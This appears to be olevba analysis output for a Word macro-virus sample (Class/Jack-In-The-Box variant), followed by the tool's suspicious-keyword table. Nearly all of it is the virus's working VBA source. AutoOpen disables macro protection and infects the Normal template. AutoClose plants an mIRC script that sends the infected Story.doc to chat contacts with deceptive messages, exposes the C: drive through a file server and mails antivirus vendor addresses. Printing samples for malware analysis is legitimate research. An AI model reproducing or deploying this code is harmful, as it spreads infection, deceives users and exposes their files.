olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-d3159674ebf61e04e5cb44c3d63bf07be5d632274fcbb1555dd11a16ec363f4b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-d3159674ebf61e04e5cb44c3d63bf07be5d632274fcbb1555dd11a16ec363f4b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/23/01 9:03:20 PM00015463
'Jack-In-The-Box
'Tester2/23/01 9:03:20 PM00015463
'Something.VirusProtection = 0
'Tester2/23/01 9:03:20 PM00015463
'Something.SaveNormalPrompt = 0
'Tester2/23/01 9:03:20 PM00015463
Application.StatusBar = 0
'Tester2/23/01 9:03:20 PM00015463
Set AnI = ActiveDocument.VBProject.VBComponents(1)
'Tester2/23/01 9:03:20 PM00015463
If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
'Tester2/23/01 9:03:20 PM00015463
If InA = 1 And InB = 1 Then Exit Sub
'Tester2/23/01 9:03:20 PM00015463
'VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
'Tester2/23/01 9:03:20 PM00015463
If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
'Tester2/23/01 9:03:20 PM00015463
somename = ActiveDocument.Name
'Tester2/23/01 9:03:20 PM00015463
If InB = 1 Then
'Tester2/23/01 9:03:20 PM00015463
var3 = "C:\mirc\script.ini"
'Tester2/23/01 9:03:20 PM00015463
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
'Tester2/23/01 9:03:20 PM00015463
Open "C:\mirc\script.ini" For Output As #1
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Tester2/23/01 9:03:20 PM00015463
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
'Tester2/23/01 9:03:20 PM00015463
Close #1
'Tester2/23/01 9:03:20 PM00015463
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
'Tester2/23/01 9:03:20 PM00015463
End If
'Tester2/23/01 9:03:20 PM00015463

'Tester2/23/01 9:03:20 PM00015463
'CommandBars("Tools").Controls("Customize...").Enabled = 0
'Tester2/23/01 9:03:20 PM00015463
'CommandBars("View").Controls("Status Bar").Enabled = 0
'Tester2/23/01 9:03:20 PM00015463

'Tester2/23/01 9:03:20 PM00015463

'Tester2/23/01 9:03:20 PM00015463
Sub ToolsMacro()
'Tester2/23/01 9:03:20 PM00015463
'Walter HÃ¶chsmann18.10.1999 16:23:58HP LaserJet III on LPT1:PA - Stellenbesetzung - Vertragsbedingungen extern.doc




End Sub











Sub AutoOpen()
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
On Error GoTo out
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.VirusProtection = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.SaveNormalPrompt = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.ConfirmConversions = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt > 70 And ad > 0 Then GoTo out
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt < 70 Then
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End If
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
host.CodeModule.AddFromFile ("c:\class.sys")
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    For x = 1 To 4
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .deletelines 1
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Next x
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt < 70 Then
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline 1, "Sub AutoClose()"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline 71, "Sub ToolsMacro()"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End If
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    For x = 2 To 72 Step 2
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Next x
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
out:
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End Sub
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Sub ViewVBCode()
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

